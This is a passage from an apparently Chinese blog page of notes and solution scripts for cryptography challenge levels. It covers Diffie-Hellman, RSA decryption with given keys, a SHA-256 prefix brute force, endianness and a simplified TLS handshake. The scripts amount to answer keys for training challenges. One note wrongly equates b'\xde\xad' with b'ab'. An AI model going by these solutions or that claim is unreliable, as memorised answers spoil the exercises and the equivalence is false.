<span class="token operator">+=</span> <span class="token string">" "</span>    show<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> (hex)"</span></span><span class="token punctuation">,</span> value_to_show<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_hex</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">input_</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">: "</span></span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>KeyboardInterrupt<span class="token punctuation">,</span> EOFError<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">input_b64</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> input_<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> (b64)"</span></span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">except</span> base64<span class="token punctuation">.</span>binascii<span class="token punctuation">.</span>Error<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to decode base64 input: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">input_hex</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> input_<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to decode hex input: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token conversion-option punctuation">!r</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">level6</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    In this challenge you will perform a Diffie-Hellman key exchange.    """</span>    <span class="token comment"># 2048-bit MODP Group from RFC3526</span>    p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>        <span class="token string">"FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "</span>        <span class="token string">"29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "</span>        <span class="token string">"EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "</span>        <span class="token string">"E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "</span>        <span class="token string">"EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "</span>        <span class="token string">"C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "</span>        <span class="token string">"83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "</span>        <span class="token string">"670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "</span>        <span class="token string">"E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "</span>        <span class="token string">"DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "</span>        <span class="token string">"15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"</span>    <span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>    g <span class="token operator">=</span> <span class="token number">2</span>    show_hex<span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    show_hex<span class="token punctuation">(</span><span class="token string">"g"</span><span class="token punctuation">,</span> g<span class="token punctuation">)</span>    a <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>    A <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> a<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    show_hex<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">,</span> A<span class="token punctuation">)</span>    B <span class="token operator">=</span> input_hex<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">)</span>    show_hex<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> B<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>B <span class="token operator">></span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid B value (B &lt;= 2**1024)"</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>B<span class="token punctuation">,</span> a<span class="token punctuation">,</span> p<span class="token punctuation">)</span>    key <span class="token operator">=</span> s<span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>    ciphertext <span class="token operator">=</span> strxor<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    show_b64<span class="token punctuation">(</span><span class="token string">"secret ciphertext"</span><span class="token punctuation">,</span> ciphertext<span class="token punctuation">)</span>level6<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240919104732.png" alt="RSA加密原理"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash<span class="token punctuation">.</span>SHA256 <span class="token keyword">import</span> SHA256Hash<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSAciphertext <span class="token operator">=</span> <span class="token string">"pVGHJ/WtzV58qQ3uY8hFa1PMBBJtv8QxgGQnpZ1cu95biUNjZ4Dg8CrhJ57Qoe26nQ3heKnYUKGZxnA6h3j7DlG0jRjgsD5bOSe5xRo97vWaY6u7M+g9XroWUfmIVhxNsM2pvzR9zIbeHNGMEbdxSVFdxvkRJErAi55jeOT4oRkAIpzlO4OcNm3PGBSwvgsfO5KEfgoupboIh0lAQipNnsLHY4mdLa8Huds/X4IIYwZkmxSJ0r4BPN+xdxLcIC/aoRXdxh0TEGq2WZ+HkXSpzuvItHgwKox3HAW4FWHFpFK+AfLnwuaBxB5lQKduxvgfzRDOl2yCkC1px5Le4rVMQQ=="</span>ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"12cd52427217d04ef33577173fa8ef213f48e623b95154bb8a6e23d2a7cdce344c843067cc67875b4e796525b85e26692ba597cbe9727f7b90b6a241ca65558ca9995336f95a3855a1509f4dbedf24353293d1152b1d1e47937a62f212fbaaddc2bf8cf1685e69c95170aacd9cb94941054147c2101fb5f41e419ce2ed160e617d6e31b7d90857af656b963c2a59775e26ed9bfa40c02667009167f119b00c99344b003fdfab547a0deb6613d65b1c0f5f082819dc933d6e67e34cb0ff9007755664cf4b33e7bf8efaaa479e8fec02fd5b74f278890d3db4325cf670ea49946075a1b8a135ffe25ed5e133d866256adde21a65d191aeda63d5d4cb515cd323eb"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>n <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"bee8fa7f5e95bdace37097dafc38316d25aa445cde1234fbd2747f818abcac74a2b6c2b3954827eef04317f0d46d05d2bf6690784e26a0d53b66f133f6af2f9d495ad6c86f93de47f91bd8fca7ce770a345ad0259b8c00e66d95d748fedc0022cee4018b9062216cb410e7e068fb60e320511c1d441c66b7ec1431996485f53d82af3382ea802a028a01f53a49d82b1eb2fa6952c562620da2a12ede4be37cff75dd989d7b1c3caa18766eaa86d659da65dfc02c33f27b40c1c4b98c9b607e1fa4362e40d07b743d4fbb51f6d1ede196969b659600c0bbbc3ce5f165e9de4288e148949b109301b5b648afea9895f75d81221e85787fd11ef16e1e5cd8740cd9"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>公私钥 mod的是 <code>phi_n = (p-1) * (q-1)</code>，真正加解密的时候mod的是<code>n = p * q</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> inverseciphertext <span class="token operator">=</span> <span class="token string">"WH0ZuAZTHrGo8CGtkNqe7gEJctBrhTrdUgcUto2cmbVv0dAP4oqjxWfw5Tf94k4XtegGgbFBQUDsdPiHbKOdO/kFgHAMPK2xvBeVHzxVlVlCfKqli8VA7svBdyrKLR6OqZch54v0d82O87TY16fQTvcC2Xw+S33ol+VlOHuv00Vg28L+rQ8Qovx3NYI2XuAR/oNtL4vDJToVimKW/fh1NE0v6+kncwGnlz8TNQ88jvt5Hdu8sKrQbf/oD5Rukyb2px05DwmVNXKwGGYdKBug4CaWe4KBRBgLlwxv+0UnDpmp62M65Xq8cL/qaKF5AwMxQqY6eY99PuHfY1UKD1lUOg=="</span>ciphertext <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span>ciphertext <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> <span class="token string">"little"</span><span class="token punctuation">)</span>q <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"eb946a9cb604e6de5b9a2965b2d1ac3c09e38f0dd42c88cc41e77debc93467feb967199fc52453c339bc112bd28d4eeeb78c1e0502b956180ad069dcb2aa9d25fbaf721e9b50392b73333c58a0e26ed93a20425191fd7eaf246ff2c927cba936fb52789f3596332e9f73b214ce31d744a30589a8db2d94eaa7ca306022fb527d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"bc8586f2f701fddd16366241c61bf88719eb0d203c03154e270a54ce3d48eaf87993468ebab60776fe3feb21050f420bbf56aabd629515a4ba1af5c9aa3f83d28ee9ea47a35e97758468f92df798bb381d448cdaa5254e2704c3eb38c30007b9f1d0759edb464bb49352170ad1ce25714960825516d773891eb1f454ee8bb497"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>phi_n <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> n <span class="token operator">=</span> p<span class="token operator">*</span>qe <span class="token operator">=</span> <span class="token number">0x10001</span>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi_n<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token string">'little'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>SHA-256（Secure Hash Algorithm 256-bit）是一个广泛使用的加密散列函数，属于 SHA-2（Secure Hash Algorithm 2）家族。它生成一个 256 位（32 字节）的散列值，是一种单向散列函数，用于确保数据的完整性和真实性。注意这里是256位的散列值是字节流，你不能直接让字节流与字符串进行对比。要么让字符串编码为字节流，要么让字节流解码为字符串。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">b'Bd'</span>b <span class="token operator">=</span> <span class="token string">"Bd"</span><span class="token keyword">print</span><span class="token punctuation">(</span>a <span class="token operator">==</span> b<span class="token punctuation">)</span>  <span class="token comment"># False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">import</span> os<span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash <span class="token keyword">import</span> SHA256 <span class="token keyword">as</span> SHA256Hash<span class="token keyword">def</span> <span class="token function">find_collision</span><span class="token punctuation">(</span>secret_hash_prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span>        <span class="token builtin">hash</span> <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">hash</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> secret_hash_prefix<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hash</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> datasecret_sha256_prefix_b64 <span class="token operator">=</span> <span class="token string">"QmQ="</span> <span class="token comment">#enter yours here</span>secret_sha256_prefix <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>secret_sha256_prefix_b64<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>secret_sha256_prefix<span class="token punctuation">)</span>collision <span class="token operator">=</span> find_collision<span class="token punctuation">(</span>secret_sha256_prefix<span class="token punctuation">)</span>collision_b64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>collision<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Collision (b64):"</span><span class="token punctuation">,</span> collision_b64<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p><code>b&#39;\xde\xad&#39;  &lt;==&gt; b&#39;ab&#39; &lt;==&gt; b&#39;\x61\x62&#39;</code></p><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 关于十六进制转字符串的问题b'\xde\xad'  &lt;==> b'ab'在形式上是一样的，只不过它通过ASCII码解码了一下，以后见到b'',里面不带\x的字母一律当将其转换成字母的ASCII码表示。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>像你这种<code>hex(pow(test2,key.d, key.n)).encode()</code>，这种就是将原来的字符串按照ASCII编码了一遍。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Python <span class="token number">3.11</span><span class="token number">.9</span> <span class="token punctuation">(</span>main<span class="token punctuation">,</span> Apr  <span class="token number">2</span> <span class="token number">2024</span><span class="token punctuation">,</span> <span class="token number">08</span><span class="token punctuation">:</span><span class="token number">25</span><span class="token punctuation">:</span><span class="token number">04</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>GCC <span class="token number">13.2</span><span class="token number">.0</span><span class="token punctuation">]</span> on linuxType <span class="token string">"help"</span><span class="token punctuation">,</span> <span class="token string">"copyright"</span><span class="token punctuation">,</span> <span class="token string">"credits"</span> <span class="token keyword">or</span> <span class="token string">"license"</span> <span class="token keyword">for</span> more information<span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">"test"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">b'test'</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"test"</span><span class="token punctuation">)</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>ValueError<span class="token punctuation">:</span> non<span class="token operator">-</span>hexadecimal number found <span class="token keyword">in</span> fromhex<span class="token punctuation">(</span><span class="token punctuation">)</span> arg at position <span class="token number">0</span><span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">"6162"</span><span class="token punctuation">)</span><span class="token string">b'ab'</span><span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>python中大小端序的区别</p><p>1024 转换为</p><ul><li>大端序（<strong>最高有效字节存放在内存地址的最低位置</strong>）是 <code>\x04\x00</code></li><li>小端序（<strong>最低有效字节存放在内存中地址最低的位置</strong>）是 <code>\x00\x04</code></li></ul><p>如果加密的过程中密文是以小端序加载的，那么解密的过程中，密文也要以小端序加载。一定要对应上。</p><h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p> In this challenge you will perform a simplified Transport Layer Security (TLS) handshake, acting as the server.    </p><p>   You will be provided with Diffie-Hellman parameters, a self-signed root certificate, and the root private key.<br>    The client will request to establish a secure channel with a particular name, and initiate a Diffie-Hellman key exchange.<br>    The server must complete the key exchange, and derive an AES-128 key from the exchanged secret.<br>    Then, using the encrypted channel, the server must supply the requested user certificate, signed by root.<br>    Finally, using the encrypted channel, the server must sign the handshake to prove ownership of the private user key.</p><p>首先是client和server通过Diffie-Hellman 密钥交换，获得共享密钥。然后通过共享密钥生成的AES对称加密的密钥。</p><p>之后client向服务器发送证书（用AES对称加密），证书签名（用AES对证书哈希以后的字符串用server的RSA私钥签名），以及用户签名（对Diffie-Hellman 密钥中的A、B以及用户名，使用AES对称加密，再用client的RSA私钥签名）</p><p>然后就是server的验证，使用AES解密证书，使用server的公钥验证证书签名，使用user的公钥验证用户签名。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Hash<span class="token punctuation">.</span>SHA256 <span class="token keyword">import</span> SHA256Hash<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random<span class="token punctuation">.</span>random <span class="token keyword">import</span> getrandbits<span class="token punctuation">,</span> randrange<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> b64<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_b64</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> (b64)"</span></span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_hex_block</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">,</span> byte_block_size<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    value_to_show <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">,</span> byte_block_size<span class="token punctuation">)</span><span class="token punctuation">:</span>        value_to_show <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>value<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span>byte_block_size<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        value_to_show <span class="token operator">+=</span> <span class="token string">" "</span>    show<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>name<span class="token punctuation">&#125;</span></span><span class="token string"> (hex)"</span></span><span class="token punctuation">,</span> value_to_show<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_hex</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>    show<span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>    <span class="token string">"FFFFFFFF FFFFFFFF C90FDAA2 2168C234 C4C6628B 80DC1CD1 "</span>    <span class="token string">"29024E08 8A67CC74 020BBEA6 3B139B22 514A0879 8E3404DD "</span>    <span class="token string">"EF9519B3 CD3A431B 302B0A6D F25F1437 4FE1356D 6D51C245 "</span>    <span class="token string">"E485B576 625E7EC6 F44C42E9 A637ED6B 0BFF5CB6 F406B7ED "</span>    <span class="token string">"EE386BFB 5A899FA5 AE9F2411 7C4B1FE6 49286651 ECE45B3D "</span>    <span class="token string">"C2007CB8 A163BF05 98DA4836 1C55D39A 69163FA8 FD24CF5F "</span>    <span class="token string">"83655D23 DCA3AD96 1C62F356 208552BB 9ED52907 7096966D "</span>    <span class="token string">"670C354E 4ABC9804 F1746C08 CA18217C 32905E46 2E36CE3B "</span>    <span class="token string">"E39E772C 180E8603 9B2783A2 EC07A28F B5C55DF0 6F4C52C9 "</span>    <span class="token string">"DE2BCBF6 95581718 3995497C EA956AE5 15D22618 98FA0510 "</span>    <span class="token string">"15728E5A 8AACAA68 FFFFFFFF FFFFFFFF"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span>g <span class="token operator">=</span> <span class="token number">2</span>b <span class="token operator">=</span> getrandbits<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span>B <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>g<span class="token punctuation">,</span> b<span class="token punctuation">,</span> p<span class="token punctuation">)</span>show_hex<span class="token punctuation">(</span><span class="token 